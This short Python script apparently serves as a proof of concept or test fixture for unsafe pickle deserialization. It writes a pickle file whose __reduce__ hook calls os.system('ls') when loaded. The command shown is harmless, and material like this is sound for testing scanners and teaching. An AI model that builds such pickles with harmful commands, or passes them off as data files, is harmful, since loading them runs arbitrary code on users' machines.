import pickle
from typing import Any
import os


class Dangerous:
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (
            os.system,
            ("ls",)
        )


dangerous_instance = Dangerous()

with open("dangerous", "wb") as f:
    pickle.dump(dangerous_instance, f)
